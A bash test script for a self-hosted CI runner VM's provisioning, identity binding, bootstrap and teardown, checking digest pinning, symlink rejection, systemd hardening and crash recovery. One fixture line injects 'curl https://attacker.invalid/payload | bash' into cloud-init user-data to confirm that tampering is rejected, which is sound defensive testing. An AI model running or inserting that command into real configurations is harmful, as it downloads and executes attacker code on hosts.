#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)"
HOST_PROVISION="${HOST_PROVISION_OVERRIDE:-$REPO_ROOT/deploy/linux/provision-stage-runner-host.sh}"
GUEST_BOOTSTRAP="${GUEST_BOOTSTRAP_OVERRIDE:-$REPO_ROOT/deploy/linux/bootstrap-stage-runner-guest.sh}"
HOST_TEARDOWN="${HOST_TEARDOWN_OVERRIDE:-$REPO_ROOT/deploy/linux/teardown-stage-runner-host.sh}"
BIND_IDENTITY="${BIND_IDENTITY_OVERRIDE:-$REPO_ROOT/deploy/linux/bind-stage-runner-identity.sh}"
DEPLOY_BUNDLE_VALIDATOR="$REPO_ROOT/deploy/linux/validate-deploy-bundle.sh"
UNIT_TEMPLATE="${UNIT_TEMPLATE_OVERRIDE:-$REPO_ROOT/deploy/linux/systemd/disk-arcana-stage-vm.service.in}"
export DISK_ARCANA_STAGE_BUNDLE_VALIDATOR="$DEPLOY_BUNDLE_VALIDATOR"

fail() {
  printf 'FAIL  %s\n' "$*" >&2
  exit 1
}

for required in \
  deploy/linux/provision-stage-runner-host.sh \
  deploy/linux/bootstrap-stage-runner-guest.sh \
  deploy/linux/bind-stage-runner-identity.sh \
  deploy/linux/teardown-stage-runner-host.sh \
  deploy/linux/systemd/disk-arcana-stage-vm.service.in; do
  [[ -f "$REPO_ROOT/$required" ]] || fail "missing $required"
done

printf 'PASS  stage runner provisioning artefacts exist\n'

run_expect() {
  local expected_status="$1" expected_marker="$2" label="$3"
  shift 3
  local output status

  set +e
  output="$("$@" 2>&1)"
  status=$?
  set -e

  if [[ "$status" -ne "$expected_status" ]]; then
    fail "$label status=$status expected=$expected_status output=$output"
  fi
  if [[ "$output" != *"$expected_marker"* ]]; then
    printf 'HARNESS_INVALID  %s missing marker=%s output=%s\n' \
      "$label" "$expected_marker" "$output" >&2
    exit 2
  fi
  printf 'PASS  %s\n' "$label"
}

run_expect 0 'control=positive' 'positive harness control' \
  bash -c 'printf "control=positive\n"'
run_expect 7 'control=negative' 'negative harness control' \
  bash -c 'printf "control=negative\n" >&2; exit 7'

fixture_root="$(mktemp -d)"
cleanup() {
  rm -rf -- "$fixture_root"
}
trap cleanup EXIT

printf 'cloud image\n' >"$fixture_root/cloud.img"
printf 'runner archive\n' >"$fixture_root/runner.tar.gz"
mkdir "$fixture_root/bundle"
printf '#cloud-config\n' >"$fixture_root/bundle/user-data"
printf 'instance-id: disk-arcana-stage-test\nlocal-hostname: disk-arcana-stage\n' \
  >"$fixture_root/bundle/meta-data"
cloud_sha="$(sha256sum "$fixture_root/cloud.img" | awk '{print $1}')"
runner_sha="$(sha256sum "$fixture_root/runner.tar.gz" | awk '{print $1}')"
bundle_sha="$({
  sha256sum "$fixture_root/bundle/user-data" | awk '{print $1 "  user-data"}'
  sha256sum "$fixture_root/bundle/meta-data" | awk '{print $1 "  meta-data"}'
} | sha256sum | awk '{print $1}')"
valid_root="/var/lib/disk-arcana-stage/test-${$}"

base_args=(
  --state-root "$valid_root"
  --cloud-image "$fixture_root/cloud.img"
  --cloud-image-sha256 "$cloud_sha"
  --guest-bundle "$fixture_root/bundle"
  --runner-archive "$fixture_root/runner.tar.gz"
  --runner-archive-sha256 "$runner_sha"
  --management-port 22446
  --guest-bundle-sha256 "$bundle_sha"
  --validate-only
)

run_expect 64 'missing required option: --state-root' \
  'missing state root is rejected' \
  bash "$HOST_PROVISION" --validate-only

invalid_root_args=("${base_args[@]}")
invalid_root_args[1]='relative/state'
run_expect 65 'state root must be absolute' \
  'relative state root is rejected' \
  bash "$HOST_PROVISION" "${invalid_root_args[@]}"

invalid_digest_args=("${base_args[@]}")
invalid_digest_args[5]='not-a-digest'
run_expect 65 'cloud image SHA-256 must be 64 lowercase hex characters' \
  'malformed cloud digest is rejected' \
  bash "$HOST_PROVISION" "${invalid_digest_args[@]}"

mismatch_args=("${base_args[@]}")
mismatch_args[5]="$(printf '0%.0s' {1..64})"
run_expect 66 'cloud image digest mismatch' \
  'wrong cloud digest is rejected before mutation' \
  bash "$HOST_PROVISION" "${mismatch_args[@]}"
[[ ! -e "$valid_root" ]] || fail 'wrong digest created guest state'

runner_mismatch_args=("${base_args[@]}")
runner_mismatch_args[11]="$(printf '0%.0s' {1..64})"
run_expect 66 'runner archive digest mismatch' \
  'wrong runner digest is rejected before mutation' \
  bash "$HOST_PROVISION" "${runner_mismatch_args[@]}"
[[ ! -e "$valid_root" ]] || fail 'wrong runner digest created guest state'

traversal_args=("${base_args[@]}")
traversal_args[1]='/var/lib/disk-arcana-stage/guest/../foreign'
run_expect 65 'state root must not contain parent traversal' \
  'state root traversal is rejected' \
  bash "$HOST_PROVISION" "${traversal_args[@]}"

port_args=("${base_args[@]}")
port_args[13]='22'
run_expect 65 'management port must be between 1024 and 65535' \
  'privileged management port is rejected' \
  bash "$HOST_PROVISION" "${port_args[@]}"

ln -s "$fixture_root/cloud.img" "$fixture_root/cloud-link.img"
cloud_link_args=("${base_args[@]}")
cloud_link_args[3]="$fixture_root/cloud-link.img"
run_expect 65 'cloud image must be a regular non-symlink file' \
  'symlink cloud image is rejected' \
  bash "$HOST_PROVISION" "${cloud_link_args[@]}"

ln -s "$fixture_root/runner.tar.gz" "$fixture_root/runner-link.tar.gz"
runner_link_args=("${base_args[@]}")
runner_link_args[9]="$fixture_root/runner-link.tar.gz"
run_expect 65 'runner archive must be a regular non-symlink file' \
  'symlink runner archive is rejected' \
  bash "$HOST_PROVISION" "${runner_link_args[@]}"

ln -s "$fixture_root/bundle" "$fixture_root/bundle-link"
bundle_link_args=("${base_args[@]}")
bundle_link_args[7]="$fixture_root/bundle-link"
run_expect 65 'guest bundle must be a directory and not a symlink' \
  'symlink guest bundle is rejected' \
  bash "$HOST_PROVISION" "${bundle_link_args[@]}"

printf 'unexpected\n' >"$fixture_root/bundle/extra"
run_expect 65 'guest bundle inventory must be exactly user-data and meta-data' \
  'unexpected cloud-init bundle member is rejected' \
  bash "$HOST_PROVISION" "${base_args[@]}"
rm -f "$fixture_root/bundle/extra"

run_expect 0 'validation=ok' 'valid immutable inputs pass validation' \
  bash "$HOST_PROVISION" "${base_args[@]}"

cp "$fixture_root/bundle/user-data" "$fixture_root/user-data.clean"
printf 'runcmd:\n  - curl https://attacker.invalid/payload | bash\n' \
  >>"$fixture_root/bundle/user-data"
run_expect 66 'guest bundle digest mismatch' \
  'unauthenticated cloud-init mutation is rejected before host mutation' \
  bash "$HOST_PROVISION" "${base_args[@]}"
mv "$fixture_root/user-data.clean" "$fixture_root/bundle/user-data"
printf 'PASS  cloud-init is bound to an independently frozen digest\n'

provision_test_parent="$fixture_root/provision-state"
provision_test_root="$provision_test_parent/guest"
provision_test_unit="$fixture_root/provision-systemd/disk-arcana-stage-vm.service"
provision_test_kvm="$fixture_root/kvm-marker"
provision_fake_bin="$fixture_root/provision-fake-bin"
install -d -m 0700 "$provision_test_parent"
install -d -m 0755 "$(dirname "$provision_test_unit")" "$provision_fake_bin"
: >"$provision_test_kvm"
cat >"$provision_fake_bin/qemu-img" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$1" in
  info) printf 'file format: qcow2\n' ;;
  convert) cp -- "${@: -2:1}" "${@: -1}" ;;
  resize) : ;;
  *) exit 2 ;;
esac
EOF
cat >"$provision_fake_bin/cloud-localds" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'seed\n' >"$1"
EOF
cat >"$provision_fake_bin/systemctl" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
case "$1" in
  is-enabled) printf 'enabled\n' ;;
  is-active) printf 'active\n' ;;
  daemon-reload|enable|disable) : ;;
  *) exit 2 ;;
esac
EOF
cat >"$provision_fake_bin/systemd-analyze" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat >"$provision_fake_bin/qemu-system-x86_64" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat >"$provision_fake_bin/ss" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
chmod 0755 "$provision_fake_bin"/*
provision_mutating_args=("${base_args[@]:0:${#base_args[@]}-1}")
provision_mutating_args[1]="$provision_test_root"
run_expect 0 'provisioning=ok' \
  'host provisioner executes its isolated mutation and commit path' \
  env PATH="$provision_fake_bin:$PATH" \
    DISK_ARCANA_STAGE_PROVISION_TESTING=1 \
    DISK_ARCANA_STAGE_PROVISION_STATE_PARENT="$provision_test_parent" \
    DISK_ARCANA_STAGE_PROVISION_UNIT_PATH="$provision_test_unit" \
    DISK_ARCANA_STAGE_PROVISION_KVM_PATH="$provision_test_kvm" \
    bash "$HOST_PROVISION" "${provision_mutating_args[@]}"
grep -Fx 'phase=COMMITTED' "$provision_test_root/phase" >/dev/null ||
  fail 'host provisioner did not commit durable state'
grep -Fx "guest_bundle_sha256=$bundle_sha" "$provision_test_root/state.manifest" >/dev/null ||
  fail 'host provisioner did not persist the authenticated cloud-init digest'
[[ -f "$provision_test_unit" && "$(stat -c '%a' "$provision_test_unit")" == 644 ]] ||
  fail 'host provisioner did not install the isolated unit'
printf 'PASS  host provisioning mutation path commits authenticated state\n'

unit_template="$UNIT_TEMPLATE"
for required_unit_text in \
  'ExecStart=/usr/bin/qemu-system-x86_64' \
  '-enable-kvm' \
  'file=@STATE_ROOT@/disk.qcow2' \
  'file=@STATE_ROOT@/seed.img' \
  'hostfwd=tcp:127.0.0.1:@MANAGEMENT_PORT@-:22' \
  '-no-reboot' \
  'NoNewPrivileges=yes' \
  'PrivateTmp=yes' \
  'DevicePolicy=closed' \
  'DeviceAllow=/dev/kvm rw' \
  'ProtectSystem=strict' \
  'ReadWritePaths=@STATE_ROOT@'; do
  grep -F -- "$required_unit_text" "$unit_template" >/dev/null ||
    fail "host unit is missing $required_unit_text"
done
if grep -Fx 'PrivateDevices=yes' "$unit_template" >/dev/null; then
  fail 'host unit hides /dev/kvm behind PrivateDevices=yes'
fi
if grep -Ei -- '(docker\.sock|9p|virtfs|filesystem)' "$unit_template" >/dev/null; then
  fail 'host unit exposes a forbidden host filesystem or Docker seam'
fi
printf 'PASS  host unit is KVM-only with loopback management and no host mounts\n'

for directive in StartLimitIntervalSec StartLimitBurst; do
  directive_section="$(
    awk -v wanted="$directive" '
      /^\[[^]]+\]$/ {section=$0}
      $0 ~ "^" wanted "=" {print section}
    ' "$unit_template"
  )"
  [[ "$directive_section" == '[Unit]' ]] ||
    fail "$directive must occur exactly once under [Unit]"
done
printf 'PASS  host VM restart limits are placed under [Unit]\n'

bind_root="$fixture_root/bind/guest"
install -d -m 0700 "$fixture_root/bind"
install -d -m 0700 "$bind_root"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$bind_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=UNREGISTERED\n'
} >"$bind_root/state.manifest"
chmod 0600 "$bind_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$fixture_root/bind/token"
chmod 0600 "$fixture_root/bind/token"
printf '{"id":987654,"name":"disk-arcana-stage","status":"online","busy":false,"labels":[{"name":"self-hosted"},{"name":"Linux"},{"name":"X64"},{"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/api-response.json"
printf '{"total_count":1,"runners":[{"id":987654,"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/group-api-response.json"
run_expect 0 'validation=ok runner_id=987654 runner_name=disk-arcana-stage' \
  'identity binding validates the exact live runner before mutation' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
grep -Fx 'runner_id=UNREGISTERED' "$bind_root/state.manifest" >/dev/null ||
  fail 'identity validation mutated the unregistered manifest'
printf 'PASS  identity validation leaves the unregistered manifest unchanged\n'
bind_manifest_before="$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')"
printf '{"id":987655,"name":"disk-arcana-stage","status":"online","busy":false,"labels":[{"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/api-response-wrong-id.json"
run_expect 66 'GitHub runner identity mismatch' \
  'identity binding rejects wrong runner ID before mutation' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response-wrong-id.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
[[ "$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')" == "$bind_manifest_before" ]] ||
  fail 'wrong live runner ID changed the host manifest'
printf 'PASS  identity mismatch leaves the host manifest byte-identical\n'

printf '{"id":987654,"name":"disk-arcana-stage","status":"offline","busy":true,"labels":[{"name":"wrong-label"}]}\n' \
  >"$fixture_root/bind/api-response-unsafe-boundary.json"
printf '{"total_count":1,"runners":[{"id":999,"name":"disk-arcana-stage"}]}\n' \
  >"$fixture_root/bind/group-api-response-wrong.json"
run_expect 66 'GitHub runner boundary mismatch' \
  'identity binding rejects offline busy wrong-label wrong-group runner' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response-unsafe-boundary.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response-wrong.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind/token" \
      --validate-only
[[ "$(sha256sum "$bind_root/state.manifest" | awk '{print $1}')" == "$bind_manifest_before" ]] ||
  fail 'unsafe runner boundary changed the host manifest'
printf 'PASS  unsafe runner boundary leaves the host manifest byte-identical\n'

bind_commit_root="$fixture_root/bind-commit/guest"
install -d -m 0700 "$fixture_root/bind-commit" "$bind_commit_root"
sed "s|^state_root=.*|state_root=$bind_commit_root|" \
  "$bind_root/state.manifest" >"$bind_commit_root/state.manifest"
chmod 0600 "$bind_commit_root/state.manifest"
install -m 0600 "$fixture_root/bind/token" "$fixture_root/bind-commit/token"
run_expect 0 'binding=committed runner_id=987654 runner_name=disk-arcana-stage' \
  'identity binding commits only the verified exact runner boundary' \
  env DISK_ARCANA_STAGE_BIND_TESTING=1 \
    DISK_ARCANA_STAGE_BIND_API_RESPONSE="$fixture_root/bind/api-response.json" \
    DISK_ARCANA_STAGE_BIND_GROUP_API_RESPONSE="$fixture_root/bind/group-api-response.json" \
    bash "$BIND_IDENTITY" \
      --state-root "$bind_commit_root" \
      --runner-id 987654 \
      --github-token-file "$fixture_root/bind-commit/token"
grep -Fx 'runner_id=987654' "$bind_commit_root/state.manifest" >/dev/null ||
  fail 'verified runner identity was not committed'
printf 'PASS  binding commit path mutates only the protected manifest\n'

bootstrap_root="$fixture_root/bootstrap"
install -d -m 0700 "$bootstrap_root"
install -d -m 0700 "$bootstrap_root/bundle"
printf 'bootstrap server\n' >"$bootstrap_root/bundle/disk-arcana-server"
chmod 0755 "$bootstrap_root/bundle/disk-arcana-server"
install -m 0644 "$REPO_ROOT/deploy/linux/disk-arcana-server.service" \
  "$bootstrap_root/bundle/disk-arcana-server.service"
for executable in deploy-server.sh deploy-server-broker.sh install.sh \
  provision-deploy-broker.sh; do
  install -m 0755 "$REPO_ROOT/deploy/linux/$executable" \
    "$bootstrap_root/bundle/$executable"
done
install -m 0440 "$REPO_ROOT/deploy/linux/disk-arcana-deploy.sudoers" \
  "$bootstrap_root/bundle/disk-arcana-deploy.sudoers"
expected_commit='1111111111111111111111111111111111111111'
printf '%s\n' "$expected_commit" >"$bootstrap_root/bundle/commit"
bash "$DEPLOY_BUNDLE_VALIDATOR" create \
  --root "$bootstrap_root/bundle" --commit "$expected_commit" >/dev/null
install -m 0600 "$fixture_root/runner.tar.gz" "$bootstrap_root/runner.tar.gz"
bootstrap_runner_sha="$(sha256sum "$bootstrap_root/runner.tar.gz" | awk '{print $1}')"
printf '%s  runner.tar.gz\n' "$bootstrap_runner_sha" \
  >"$bootstrap_root/runner.tar.gz.sha256"
chmod 0600 "$bootstrap_root/runner.tar.gz.sha256"
registration_token='registration-token-1234567890'
removal_token='removal-token-123456789012345'
{
  printf 'runner_url=https://github.com/Arcanada-one\n'
  printf 'runner_group=disk-arcana-stage\n'
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_label=disk-arcana-stage\n'
  printf 'authority_run_id=31444643689\n'
  printf 'registration_token=%s\n' "$registration_token"
  printf 'removal_token=%s\n' "$removal_token"
} >"$bootstrap_root/registration.env"
chmod 0600 "$bootstrap_root/registration.env"

guest_base_args=(
  --bootstrap-root "$bootstrap_root"
  --expected-commit "$expected_commit"
  --expected-hostname disk-arcana-stage
  --validate-only
)

run_expect 64 'missing required option: --bootstrap-root' \
  'guest bootstrap requires a protected root' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" --validate-only

run_expect 0 'validation=ok' \
  'guest bootstrap accepts exact protected immutable inputs' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"

registration_arm_line="$(
  grep -nF 'runner_registration_attempted=true' "$GUEST_BOOTSTRAP" | cut -d: -f1 || true
)"
registration_call_line="$(
  grep -nF "runuser -u disk-stage -- \"\$runner_install_root/config.sh\"" "$GUEST_BOOTSTRAP" |
    tail -n 1 | cut -d: -f1
)"
[[ "$registration_arm_line" =~ ^[0-9]+$ && "$registration_call_line" =~ ^[0-9]+$ &&
   "$registration_arm_line" -lt "$registration_call_line" ]] ||
  fail 'runner cleanup is not armed before the registration side effect'
grep -F 'runner_registration_attempted" == true' "$GUEST_BOOTSTRAP" >/dev/null ||
  fail 'runner cleanup does not consume the pre-registration arm'
printf 'PASS  runner cleanup is armed before registration can partially succeed\n'

teardown_root="$fixture_root/teardown/guest"
install -d -m 0700 "$fixture_root/teardown"
install -d -m 0700 "$teardown_root"
runner_id=987654
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=%s\n' "$runner_id"
} >"$teardown_root/state.manifest"
chmod 0600 "$teardown_root/state.manifest"
printf 'github-api-token-1234567890\n' >"$fixture_root/teardown/token"
chmod 0600 "$fixture_root/teardown/token"
printf '{"id":%s,"name":"disk-arcana-stage"}\n' "$runner_id" \
  >"$fixture_root/teardown/api-response.json"

teardown_args=(
  --state-root "$teardown_root"
  --github-token-file "$fixture_root/teardown/token"
  --validate-only
)
run_expect 0 'validation=ok runner_id=987654 runner_name=disk-arcana-stage' \
  'teardown accepts exact manifest and live runner identity' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_RESPONSE="$fixture_root/teardown/api-response.json" \
    bash "$HOST_TEARDOWN" "${teardown_args[@]}"

teardown_before="$(
  find "$fixture_root/teardown" -type f -printf '%P %m ' -exec sha256sum {} \; |
    LC_ALL=C sort | sha256sum | awk '{print $1}'
)"
printf '{"id":987655,"name":"disk-arcana-stage"}\n' \
  >"$fixture_root/teardown/api-response-wrong-id.json"
run_expect 66 'GitHub runner identity mismatch' \
  'teardown rejects wrong runner ID before mutation' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_RESPONSE="$fixture_root/teardown/api-response-wrong-id.json" \
    bash "$HOST_TEARDOWN" "${teardown_args[@]}"
rm -f "$fixture_root/teardown/api-response-wrong-id.json"
teardown_after="$(
  find "$fixture_root/teardown" -type f -printf '%P %m ' -exec sha256sum {} \; |
    LC_ALL=C sort | sha256sum | awk '{print $1}'
)"
[[ "$teardown_before" == "$teardown_after" ]] ||
  fail 'wrong runner ID changed teardown state'
printf 'PASS  teardown identity mismatch leaves protected state byte-identical\n'

teardown_crash_parent="$fixture_root/teardown-crash"
teardown_crash_root="$teardown_crash_parent/guest"
teardown_crash_unit="$teardown_crash_parent/disk-arcana-stage-vm.service"
teardown_crash_diagnostics="$teardown_crash_parent/diagnostics"
install -d -m 0700 "$teardown_crash_parent" "$teardown_crash_root"
{
  printf 'guest_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_crash_root"
  printf 'host_unit=disk-arcana-stage-vm.service\n'
  printf 'management_port=22446\n'
  printf 'cloud_image_sha256=%s\n' "$cloud_sha"
  printf 'guest_bundle_sha256=%s\n' "$bundle_sha"
  printf 'runner_archive_sha256=%s\n' "$runner_sha"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_id=%s\n' "$runner_id"
} >"$teardown_crash_root/state.manifest"
chmod 0600 "$teardown_crash_root/state.manifest"
{
  printf 'phase=RUNNER_DEREGISTERED\n'
  printf 'runner_id=%s\n' "$runner_id"
  printf 'runner_name=disk-arcana-stage\n'
  printf 'state_root=%s\n' "$teardown_crash_root"
} >"$teardown_crash_root/teardown-current"
chmod 0600 "$teardown_crash_root/teardown-current"
printf 'github-api-token-1234567890\n' >"$teardown_crash_parent/token"
chmod 0600 "$teardown_crash_parent/token"
printf 'ExecStart=/usr/bin/qemu-system-x86_64 -drive file=%s/disk.qcow2\n' \
  "$teardown_crash_root" >"$teardown_crash_unit"

run_expect 99 'injected interruption after unit removal' \
  'teardown journals destructive intent before an interrupted unit removal' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_STATUS=404 \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_crash_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_crash_diagnostics" \
    DISK_ARCANA_STAGE_TEARDOWN_FAIL_AFTER_UNIT_REMOVE=1 \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_crash_root" \
      --github-token-file "$teardown_crash_parent/token"
[[ ! -e "$teardown_crash_unit" ]] || fail 'injected teardown left the unit in place'
grep -Fx 'phase=UNIT_REMOVE_INTENT' "$teardown_crash_root/teardown-current" >/dev/null ||
  fail 'teardown did not persist unit-removal intent before deletion'
run_expect 0 'teardown=ok runner_id=987654' \
  'teardown resumes after unit deletion and preserves diagnostics' \
  env DISK_ARCANA_STAGE_TEARDOWN_TESTING=1 \
    DISK_ARCANA_STAGE_TEARDOWN_API_STATUS=404 \
    DISK_ARCANA_STAGE_TEARDOWN_UNIT_PATH="$teardown_crash_unit" \
    DISK_ARCANA_STAGE_TEARDOWN_DIAGNOSTICS_ROOT="$teardown_crash_diagnostics" \
    bash "$HOST_TEARDOWN" \
      --state-root "$teardown_crash_root" \
      --github-token-file "$teardown_crash_parent/token"
[[ ! -e "$teardown_crash_root" ]] || fail 'resumed teardown left the live state root in place'
find "$teardown_crash_diagnostics" -mindepth 1 -maxdepth 1 -type d -name "*-$runner_id" \
  -print -quit | grep -q . || fail 'resumed teardown did not preserve diagnostics'
printf 'PASS  teardown unit-removal crash is behaviorally resumable\n'

validation_output="$(
  DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"
)"
[[ "$validation_output" != *"$registration_token"* && \
   "$validation_output" != *"$removal_token"* ]] ||
  fail 'guest validation exposed registration material'
printf 'PASS  guest validation does not expose registration material\n'

chmod 0644 "$bootstrap_root/registration.env"
run_expect 65 'registration file has unsafe metadata' \
  'world-readable registration material is rejected' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"
chmod 0600 "$bootstrap_root/registration.env"

printf '%s  runner.tar.gz\n' "$(printf '0%.0s' {1..64})" \
  >"$bootstrap_root/runner.tar.gz.sha256"
run_expect 66 'runner archive digest mismatch' \
  'guest bootstrap rejects runner digest mismatch before mutation' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 bash "$GUEST_BOOTSTRAP" \
    "${guest_base_args[@]}"

bootstrap_recovery_root="$fixture_root/bootstrap-recovery-input"
bootstrap_recovery_state="$fixture_root/bootstrap-recovery-state"
bootstrap_recovery_runner="$fixture_root/bootstrap-recovery-runner"
install -d -m 0700 "$bootstrap_recovery_root" "$bootstrap_recovery_state"
install -d -m 0750 "$bootstrap_recovery_runner"
{
  printf 'phase=REGISTRATION_INTENT\n'
  printf 'commit=%s\n' "$expected_commit"
  printf 'runner_name=disk-arcana-stage\n'
} >"$bootstrap_recovery_state/bootstrap-current"
chmod 0600 "$bootstrap_recovery_state/bootstrap-current"
{
  printf 'runner_url=https://github.com/Arcanada-one\n'
  printf 'runner_group=disk-arcana-stage\n'
  printf 'runner_name=disk-arcana-stage\n'
  printf 'runner_label=disk-arcana-stage\n'
  printf 'registration_token=%s\n' "$registration_token"
  printf 'removal_token=%s\n' "$removal_token"
} >"$bootstrap_recovery_state/recovery.env"
chmod 0600 "$bootstrap_recovery_state/recovery.env"
printf '{"agentId":987654,"agentName":"disk-arcana-stage"}\n' \
  >"$bootstrap_recovery_runner/.runner"
cat >"$bootstrap_recovery_runner/config.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "$1" >>"$DISK_ARCANA_STAGE_TEST_CONFIG_LOG"
if [[ "$1" == remove ]]; then
  rm -f -- "$(dirname "$0")/.runner"
else
  printf '{"agentId":987654,"agentName":"disk-arcana-stage"}\n' >"$(dirname "$0")/.runner"
fi
EOF
chmod 0755 "$bootstrap_recovery_runner/config.sh"
run_expect 0 'recovery=ok runner_name=disk-arcana-stage prior_phase=REGISTRATION_INTENT' \
  'guest bootstrap recovery consumes the durable journal and revokes the runner' \
  env DISK_ARCANA_STAGE_BOOTSTRAP_TESTING=1 \
    DISK_ARCANA_STAGE_BOOTSTRAP_STATE_ROOT="$bootstrap_recovery_state" \
    DISK_ARCANA_STAGE_BOOTSTRAP_RUNNER_ROOT="$bootstrap_recovery_runner" \
    DISK_ARCANA_STAGE_TEST_CONFIG_LOG="$fixture_root/bootstrap-recovery-config.log" \
    bash "$GUEST_BOOTSTRAP" \
      --bootstrap-root "$bootstrap_recovery_root" \
      --expected-commit "$expected_commit" \
      --expected-hostname disk-arcana-stage \
      --recover-only
grep -Fx remove "$fixture_root/bootstrap-recovery-config.log" >/dev/null ||
  fail 'bootstrap recovery did not execute runner revocation'
[[ ! -e "$bootstrap_recovery_runner/.runner" &&
   ! -e "$bootstrap_recovery_state/recovery.env" ]] ||
  fail 'bootstrap recovery retained live runner state or recovery authority'
grep -Fx 'phase=RECOVERED' "$bootstrap_recovery_state/bootstrap-current" >/dev/null ||
  fail 'bootstrap recovery did not persist its terminal phase'
printf 'PASS  bootstrap registration crash is behaviorally recoverable\n'
